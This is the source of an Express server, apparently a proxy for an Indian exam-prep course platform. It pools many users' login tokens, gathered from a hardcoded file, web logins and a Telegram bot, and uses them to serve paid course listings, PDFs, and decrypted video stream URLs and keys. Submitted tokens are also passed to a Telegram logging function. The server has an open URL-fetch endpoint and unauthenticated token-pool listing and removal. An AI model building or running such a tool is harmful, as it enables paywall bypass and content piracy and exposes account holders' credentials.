// server.js — RG-MAXX API v3
// ✅ Manual users.js se hardcoded tokens boot pe load hote hain
// ✅ Dynamic login/telegram bhi kaam karta hai
// ✅ /api/users endpoint — sab users ek jagah dikhte hain

import "dotenv/config";
import express from "express";
import fetch from "node-fetch";
import { BASE_URL, BASE_HEADERS, makeHeaders, decrypt } from "./lib/config.js";
import {
  addToken, removeToken, getAllTokens,
  getTokenCount, getToken, getAnyToken,
  getTokenForBatch, clearPool, updateBatches,
} from "./lib/tokenStore.js";
import { smartFetch } from "./lib/smartFetch.js";
import { fetchUserBatches } from "./lib/fetchBatches.js";
import {
  sendLog, buildLoginLog,
  processTelegramUpdate, setWebhook,
} from "./lib/telegram.js";
import { MANUAL_USERS } from "./users.js";

const app = express();
app.use(express.json());

// ── CORS ────────────────────────────────────────────────────────────────────
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

// ══════════════════════════════════════════════════════════════════════════════
// BOOT — users.js se sab tokens load karo (server start hone pe)
// ══════════════════════════════════════════════════════════════════════════════
async function loadManualUsers() {
  console.log(`\n📋 users.js se ${MANUAL_USERS.length} users load ho rahe hain...`);
  let loaded = 0;
  for (const u of MANUAL_USERS) {
    if (!u.userId || !u.token) continue;
    // Skip placeholder tokens
    if (u.token.startsWith("TOKEN_") && u.token.endsWith("_YAHAN_PASTE_KARO")) {
      console.log(`  ⚠️  User ${u.userId} (${u.name}) — placeholder token, skip`);
      continue;
    }
    try {
      const batches = await fetchUserBatches(u.userId, u.token);
      addToken(u.userId, u.token, u.name || "", batches, "manual");
      console.log(`  ✅ ${u.name || u.userId} — ${batches.length} batches`);
      loaded++;
    } catch (err) {
      console.log(`  ❌ ${u.userId} — Error: ${err.message}`);
    }
  }
  console.log(`✅ ${loaded}/${MANUAL_USERS.length} users loaded\n`);
}

// ══════════════════════════════════════════════════════════════════════════════
// HOME — API DOCS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/", (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>RG-MAXX API v3</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;padding:24px;max-width:960px;margin:auto}
h1{color:#58a6ff;font-size:2rem;margin-bottom:6px}
.sub{color:#8b949e;margin-bottom:20px}
h2{color:#58a6ff;font-size:1.1rem;margin:28px 0 10px;border-bottom:1px solid #30363d;padding-bottom:6px}
.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:14px 18px;margin-bottom:10px}
.method{display:inline-block;padding:2px 9px;border-radius:4px;font-size:.75rem;font-weight:700;margin-right:8px}
.GET{background:#1f3a5f;color:#79c0ff}.POST{background:#1a3a1a;color:#56d364}
code{background:#0d1117;padding:2px 7px;border-radius:4px;font-size:.85rem;color:#79c0ff;font-family:monospace}
.desc{color:#8b949e;font-size:.88rem;margin-top:5px}
.params{font-size:.82rem;color:#d2a679;margin-top:5px}
.flow{background:#0d2a1a;border:1px solid #2ea043;border-radius:8px;padding:14px 18px;margin-bottom:20px;font-size:.9rem;line-height:1.8}
.new-flow{background:#1a0d2a;border:1px solid #8957e5;border-radius:8px;padding:14px 18px;margin-bottom:20px;font-size:.9rem;line-height:1.8}
.status-bar{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:10px 16px;margin-bottom:20px;display:flex;gap:20px;align-items:center}
pre{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:12px;font-size:.8rem;overflow-x:auto;margin-top:8px}
.badge{display:inline-block;background:#8957e5;color:#fff;padding:1px 8px;border-radius:10px;font-size:.7rem;margin-left:6px;vertical-align:middle}
</style>
</head>
<body>
<h1>⚡ RG-MAXX API <span style="font-size:1rem;color:#8957e5">v3</span></h1>
<p class="sub">RG Vikramjeet Course Proxy — Manual Users + Dynamic Login + Telegram Bot</p>

<div class="status-bar">
  🟢 Online &nbsp;|&nbsp; Tokens in pool: <strong id="tc">...</strong>
  <script>fetch('/api/status').then(r=>r.json()).then(d=>document.getElementById('tc').textContent=d.tokens)</script>
</div>

<div class="new-flow">
<b>🆕 v3 — users.js se Manual Token Add karo:</b><br>
Server root mein <code>users.js</code> file hai. Isme apne userId aur token add karo — server start hote hi sab automatically load ho jaate hain. Jitne chahein utne users add karo!
<pre style="margin-top:8px">// users.js
export const MANUAL_USERS = [
  { userId: "123456", token: "eyJhbG...", name: "Rahul" },
  { userId: "789012", token: "eyJhbG...", name: "Priya" },
  // ...aur jitne chahein
];</pre>
</div>

<div class="flow">
<b>🔄 How it works (v3):</b><br>
<b>Path 1 — users.js (NEW):</b> Apne userId+token <code>users.js</code> mein hardcode karo → Server restart pe auto-load ✅<br><br>
<b>Path 2 — Website:</b> User logs in → Frontend calls <code>POST /api/login</code> → Pool mein add ✅<br><br>
<b>Path 3 — Telegram Bot:</b> <code>/add userId token</code> send karo → Pool mein add ✅<br><br>
<b>Content Access:</b> Sab API calls automatically sahi token use karte hain 🎯
</div>

<h2>🆕 v3 — Manual Users</h2>

<div class="card">
  <span class="method GET">GET</span><code>/api/users</code> <span class="badge">NEW v3</span>
  <div class="desc">Sab manually added + dynamically added users list karo (source bhi dikhega)</div>
</div>
<div class="card">
  <span class="method GET">GET</span><code>/api/reload-users</code> <span class="badge">NEW v3</span>
  <div class="desc">users.js se dobara reload karo (bina server restart ke). Secret required.</div>
  <div class="params">Query: secret=YOUR_ADMIN_SECRET</div>
</div>

<h2>🔐 Authentication</h2>

<div class="card">
  <span class="method POST">POST</span><code>/api/login</code>
  <div class="desc">Website login. Auto-fetches batches, adds to pool, logs to Telegram.</div>
  <pre>Body: { "userId": "123456", "token": "eyJ..." }

Response: {
  "success": true,
  "userId": "123456",
  "batchCount": 3,
  "batches": [{ "id": "257", "name": "NEET 2025 Batch", "expiry": "..." }]
}</pre>
</div>

<div class="card">
  <span class="method GET">GET</span><code>/api/add-token?userid=123&token=eyJ...</code>
  <div class="desc">Manually add token via URL (also logs to Telegram).</div>
</div>

<div class="card">
  <span class="method POST">POST</span><code>/api/bulk-login</code>
  <div class="desc">Ek saath kai tokens add karo. Array bhejo: <code>[{userId, token}]</code></div>
</div>

<h2>📊 Pool Management</h2>

<div class="card">
  <span class="method GET">GET</span><code>/api/status</code>
  <div class="desc">Server status + token count</div>
</div>
<div class="card">
  <span class="method GET">GET</span><code>/api/pool</code>
  <div class="desc">Sab tokens list karo — userId, batch count, source (manual/website/telegram)</div>
</div>
<div class="card">
  <span class="method GET">GET</span><code>/api/remove-token?userid=123</code>
  <div class="desc">Ek token pool se hatao</div>
</div>
<div class="card">
  <span class="method GET">GET</span><code>/api/clear-pool?secret=YOUR_ADMIN_SECRET</code>
  <div class="desc">Pura pool clear karo</div>
</div>

<h2>📚 Batches / Courses</h2>

<div class="card">
  <span class="method GET">GET</span><code>/api/all-batches</code>
  <div class="desc">Sab tokens ke sab unique courses combined</div>
</div>
<div class="card">
  <span class="method GET">GET</span><code>/api/my-courses?userid=123</code>
  <div class="desc">Kisi specific user ke courses</div>
</div>

<h2>📖 Course Content</h2>

<div class="card">
  <span class="method GET">GET</span><code>/api/subjects?courseid=257</code>
  <div class="params">Required: courseid</div>
</div>
<div class="card">
  <span class="method GET">GET</span><code>/api/topics?courseid=257&subjectid=1</code>
  <div class="params">Required: courseid, subjectid</div>
</div>
<div class="card">
  <span class="method GET">GET</span><code>/api/concepts?courseid=257&subjectid=1&topicid=1</code>
  <div class="params">Required: courseid, subjectid, topicid</div>
</div>
<div class="card">
  <span class="method GET">GET</span><code>/api/videos?courseid=257&subjectid=1&topicid=1&conceptid=1</code>
  <div class="desc">Video/PDF list for a concept</div>
</div>
<div class="card">
  <span class="method GET">GET</span><code>/api/video-details?course_id=257&video_id=12345</code>
  <div class="desc">Decrypted stream URLs for a video</div>
</div>

<h2>🧪 Tests</h2>

<div class="card">
  <span class="method GET">GET</span><code>/api/tests?testseriesid=100&subject_id=1</code>
</div>
<div class="card">
  <span class="method GET">GET</span><code>/api/questions?url=https://...</code>
  <div class="desc">Proxy to fetch questions JSON</div>
</div>

<h2>🤖 Telegram Bot Setup</h2>

<div class="card">
  <span class="method GET">GET</span><code>/api/set-webhook</code>
  <div class="desc">One-time setup: Vercel URL Telegram pe register karo. Deploy ke baad ek baar call karo!</div>
</div>
<div class="card">
  <span class="method POST">POST</span><code>/api/telegram-webhook</code>
  <div class="desc">Telegram automatically yahan updates bhejta hai (manually mat call karo)</div>
</div>

<p style="margin-top:30px;color:#8b949e;font-size:.82rem">RG-MAXX API v3 • Vercel Node.js</p>
</body></html>`);
});

// ══════════════════════════════════════════════════════════════════════════════
// STATUS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/status", (req, res) => {
  res.json({
    status: "RG-MAXX API v3 Online",
    version: "v3",
    tokens: getTokenCount(),
    manual_users_defined: MANUAL_USERS.filter(
      u => u.token && !u.token.startsWith("TOKEN_")
    ).length,
    telegram_bot: !!process.env.TELEGRAM_BOT_TOKEN,
    telegram_channel: !!process.env.TELEGRAM_LOG_CHANNEL_ID,
  });
});

// ══════════════════════════════════════════════════════════════════════════════
// v3 — ALL USERS LIST (manual + dynamic)
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/users", (req, res) => {
  const users = getAllTokens().map((t) => ({
    userId: t.userId,
    name: t.name || "",
    source: t.source || "unknown",
    batchCount: t.batches.length,
    batches: t.batches.map((b) => ({ id: b.id, name: b.name, expiry: b.expiry || "" })),
    addedAt: t.addedAt,
    tokenPreview: t.token.substring(0, 20) + "...",
  }));
  res.json({
    total: users.length,
    manual: users.filter(u => u.source === "manual").length,
    dynamic: users.filter(u => u.source !== "manual").length,
    users,
  });
});

// ══════════════════════════════════════════════════════════════════════════════
// v3 — RELOAD users.js (bina restart ke dobara load)
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/reload-users", async (req, res) => {
  const { secret } = req.query;
  if (process.env.ADMIN_SECRET && secret !== process.env.ADMIN_SECRET) {
    return res.status(403).json({ error: "Forbidden: wrong secret" });
  }

  let loaded = 0;
  let skipped = 0;
  const results = [];

  for (const u of MANUAL_USERS) {
    if (!u.userId || !u.token) { skipped++; continue; }
    if (u.token.startsWith("TOKEN_") && u.token.endsWith("_YAHAN_PASTE_KARO")) {
      skipped++;
      results.push({ userId: u.userId, name: u.name, status: "placeholder_skipped" });
      continue;
    }
    try {
      const batches = await fetchUserBatches(u.userId, u.token);
      addToken(u.userId, u.token, u.name || "", batches, "manual");
      loaded++;
      results.push({ userId: u.userId, name: u.name, status: "loaded", batchCount: batches.length });
    } catch (err) {
      skipped++;
      results.push({ userId: u.userId, name: u.name, status: "error", error: err.message });
    }
  }

  res.json({ success: true, loaded, skipped, totalInPool: getTokenCount(), results });
});

// ══════════════════════════════════════════════════════════════════════════════
// LOGIN — Website calls this after user logs in
// ══════════════════════════════════════════════════════════════════════════════
app.post("/api/login", async (req, res) => {
  try {
    const { userId, token } = req.body || {};
    if (!userId || !token) {
      return res.status(400).json({ success: false, error: "userId and token are required" });
    }

    const batches = await fetchUserBatches(userId, token);
    addToken(userId, token, "", batches, "login");
    await sendLog(buildLoginLog(userId, token, batches, "website"));

    res.json({
      success: true,
      userId,
      batchCount: batches.length,
      batches,
      message: "Token added to pool. Content is now accessible.",
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// ADD TOKEN — manual GET method
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/add-token", async (req, res) => {
  try {
    const { userid, token, name } = req.query;
    if (!userid || !token) {
      return res.status(400).json({ success: false, error: "userid and token required" });
    }

    const batches = await fetchUserBatches(userid, token);
    addToken(userid, token, name || "", batches, "api");
    await sendLog(buildLoginLog(userid, token, batches, "api"));

    res.json({ success: true, userId: userid, batchCount: batches.length, batches });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// BULK LOGIN
// ══════════════════════════════════════════════════════════════════════════════
app.post("/api/bulk-login", async (req, res) => {
  try {
    const users = Array.isArray(req.body) ? req.body : [];
    if (users.length === 0) {
      return res.status(400).json({ error: "Send array: [{userId, token}, ...]" });
    }

    let added = 0;
    for (const u of users) {
      if (!u.userId || !u.token) continue;
      addToken(u.userId, u.token, u.name || "", [], "bulk");
      added++;
    }

    res.json({
      success: true,
      added,
      total: getTokenCount(),
      note: "Batches not pre-fetched in bulk mode.",
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// REMOVE TOKEN
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/remove-token", (req, res) => {
  const { userid } = req.query;
  if (!userid) return res.status(400).json({ error: "userid required" });
  const removed = removeToken(userid);
  res.json({ success: removed, userId: userid });
});

// ══════════════════════════════════════════════════════════════════════════════
// POOL INFO
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/pool", (req, res) => {
  const users = getAllTokens().map((t) => ({
    userId: t.userId,
    name: t.name || "",
    source: t.source || "unknown",
    batchCount: t.batches.length,
    batchNames: t.batches.map((b) => `[${b.id}] ${b.name}`),
    addedAt: t.addedAt,
    tokenPreview: t.token.substring(0, 25) + "...",
  }));
  res.json({ total: users.length, users });
});

// ══════════════════════════════════════════════════════════════════════════════
// CLEAR POOL
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/clear-pool", (req, res) => {
  const { secret } = req.query;
  if (process.env.ADMIN_SECRET && secret !== process.env.ADMIN_SECRET) {
    return res.status(403).json({ error: "Forbidden: wrong secret" });
  }
  const count = clearPool();
  res.json({ success: true, cleared: count });
});

// ══════════════════════════════════════════════════════════════════════════════
// ALL BATCHES — from all tokens combined
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/all-batches", async (req, res) => {
  try {
    const tokens = getAllTokens();
    if (tokens.length === 0) {
      return res.json({ status: 200, total: 0, data: [], message: "No tokens in pool" });
    }

    const masterList = [];
    const seenIds = new Set();

    await Promise.allSettled(
      tokens.map(async (entry) => {
        try {
          const headers = makeHeaders(entry.token, entry.userId);
          const resp = await fetch(
            `${BASE_URL}/get/get_all_purchases?userid=${entry.userId}`,
            { headers, timeout: 10000 }
          );
          if (!resp.ok) return;
          const data = await resp.json();
          for (const item of data.data || []) {
            if (item.itemtype === "Course" && item.coursedt?.[0]) {
              const c = item.coursedt[0];
              const id = String(c.id);
              if (!seenIds.has(id)) {
                seenIds.add(id);
                masterList.push({
                  id,
                  name: c.course_name,
                  thumbnail: c.course_thumbnail,
                  expiry: item.enddatetime,
                });
                if (!entry.batchIds?.includes(id)) {
                  entry.batches = entry.batches || [];
                  entry.batches.push({ id, name: c.course_name });
                  updateBatches(entry.userId, entry.batches);
                }
              }
            }
          }
        } catch (_) {}
      })
    );

    res.json({ status: 200, total: masterList.length, data: masterList });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// MY COURSES — for specific user
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/my-courses", async (req, res) => {
  try {
    const { userid } = req.query;
    const entry = userid ? getToken(userid) : getAnyToken();
    if (!entry) return res.status(503).json({ error: "No token found for this user" });

    const headers = makeHeaders(entry.token, entry.userId);
    const resp = await fetch(`${BASE_URL}/get/mycourseweb?userid=${entry.userId}`, { headers });
    const data = await resp.json();

    const courses = (data.data || []).map((c) => ({
      id: c.id,
      name: c.course_name,
      thumbnail: c.course_thumbnail,
      expiry: c.expiryDate,
      is_paid: c.is_paid,
    }));

    res.json({ total: courses.length, courses });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// SUBJECTS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/subjects", async (req, res) => {
  try {
    const { courseid } = req.query;
    if (!courseid) return res.status(400).json({ error: "courseid required" });

    const result = await smartFetch(
      "/get/allsubjectfrmlivecourseclass",
      { courseid, start: "-1" },
      false,
      courseid
    );
    if (result.status !== 200) return res.status(result.status).json({ error: result.error });

    const subjects = (result.data || []).map((s) => ({
      id: s.subjectid,
      name: s.subject_name,
    }));
    res.json({ total: subjects.length, subjects });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// TOPICS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/topics", async (req, res) => {
  try {
    const { courseid, subjectid } = req.query;
    if (!courseid || !subjectid) return res.status(400).json({ error: "courseid and subjectid required" });

    const result = await smartFetch(
      "/get/alltopicfrmlivecourseclass",
      { courseid, subjectid, start: "-1" },
      false,
      courseid
    );
    if (result.status !== 200) return res.status(result.status).json({ error: result.error });

    const topics = (result.data || []).map((t) => ({
      id: t.topicid,
      name: t.topic_name,
    }));
    res.json({ total: topics.length, topics });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// CONCEPTS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/concepts", async (req, res) => {
  try {
    const { courseid, subjectid, topicid } = req.query;
    if (!courseid || !subjectid || !topicid) {
      return res.status(400).json({ error: "courseid, subjectid, topicid required" });
    }

    const result = await smartFetch(
      "/get/allconceptfrmlivecourseclass",
      { courseid, subjectid, topicid, start: "-1" },
      false,
      courseid
    );
    if (result.status !== 200) return res.status(result.status).json({ error: result.error });

    const concepts = (result.data || []).map((c) => ({
      id: c.conceptid,
      name: c.concept_name,
    }));
    res.json({ total: concepts.length, concepts });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// VIDEOS (content list)
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/videos", async (req, res) => {
  try {
    const { courseid, subjectid, topicid, conceptid } = req.query;
    if (!courseid || !subjectid || !topicid) {
      return res.status(400).json({ error: "courseid, subjectid, topicid required" });
    }

    const result = await smartFetch(
      "/get/livecourseclassbycoursesubtopconceptapiv3",
      { courseid, subjectid, topicid, conceptid: conceptid || "1", start: "0" },
      false,
      courseid
    );
    if (result.status !== 200) return res.status(result.status).json({ error: result.error });

    const content = (result.data || []).map((i) => ({
      id: i.id,
      title: i.Title,
      type: i.material_type,
      pdf_url: decrypt(i.pdf_link),
      player_url: i.video_player_url ? i.video_player_url + i.video_player_token : null,
      video_id: i.video_id || null,
      duration: i.video_duration || null,
    }));
    res.json({ total: content.length, content });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// VIDEO DETAILS (decrypted streams)
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/video-details", async (req, res) => {
  try {
    const { course_id, video_id } = req.query;
    if (!video_id) return res.status(400).json({ error: "video_id required" });

    const result = await smartFetch(
      "/get/fetchVideoDetailsById",
      { course_id: course_id || "257", video_id, ytflag: "0", folder_wise_course: "0", lc_app_api_url: "" },
      true,
      course_id
    );
    if (result.status !== 200) return res.status(result.status).json({ error: result.error });

    const data = result.data || {};
    const streams = (data.encrypted_links || []).map((q) => ({
      quality: q.quality,
      url: decrypt(q.path),
      key: decrypt(q.key),
    }));

    res.json({
      video_id,
      title: data.title || "",
      duration: data.video_duration || "",
      streams,
      player_url: data.video_player_url
        ? data.video_player_url + (data.video_player_token || "")
        : null,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// TESTS
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/tests", async (req, res) => {
  try {
    const { testseriesid, subject_id } = req.query;
    if (!testseriesid) return res.status(400).json({ error: "testseriesid required" });

    const entry = getAnyToken();
    if (!entry) return res.status(503).json({ error: "No tokens in pool" });

    const headers = makeHeaders(entry.token, entry.userId);
    const url = `${BASE_URL}/get/test_titlev2?testseriesid=${testseriesid}&subject_id=${subject_id || ""}&userid=${entry.userId}&start=-1`;
    const resp = await fetch(url, { headers });
    const j = await resp.json();

    const tests = (j.test_titles || []).map((t) => ({
      id: t.id,
      title: t.title,
      questions_url: t.test_questions_url,
    }));
    res.json({ total: tests.length, tests });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// QUESTIONS PROXY
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/questions", async (req, res) => {
  try {
    const { url } = req.query;
    if (!url) return res.status(400).json({ error: "url required" });
    const resp = await fetch(url);
    const j = await resp.json();
    res.json(j);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK
// ══════════════════════════════════════════════════════════════════════════════
app.post("/api/telegram-webhook", async (req, res) => {
  try {
    res.sendStatus(200);
    await processTelegramUpdate(req.body);
  } catch (err) {
    console.error("[Webhook] Error:", err.message);
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// SET WEBHOOK
// ══════════════════════════════════════════════════════════════════════════════
app.get("/api/set-webhook", async (req, res) => {
  try {
    const host = req.headers.host;
    const protocol = host.includes("localhost") ? "http" : "https";
    const webhookUrl = `${protocol}://${host}/api/telegram-webhook`;
    const result = await setWebhook(webhookUrl);
    res.json({ webhookUrl, telegramResponse: result });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// 404
// ══════════════════════════════════════════════════════════════════════════════
app.use((req, res) => {
  res.status(404).json({ error: "Not found. Visit / for API docs." });
});

// ══════════════════════════════════════════════════════════════════════════════
// START
// ══════════════════════════════════════════════════════════════════════════════
const PORT = process.env.PORT || 3000;

// Boot: pehle users.js load karo, phir server start karo
loadManualUsers().then(() => {
  app.listen(PORT, () => {
    console.log(`✅ RG-MAXX API v3 on port ${PORT}`);
    console.log(`📖 Docs: http://localhost:${PORT}/`);
    console.log(`🤖 Telegram bot: ${process.env.TELEGRAM_BOT_TOKEN ? "configured" : "NOT configured"}`);
  });
});

export default app;
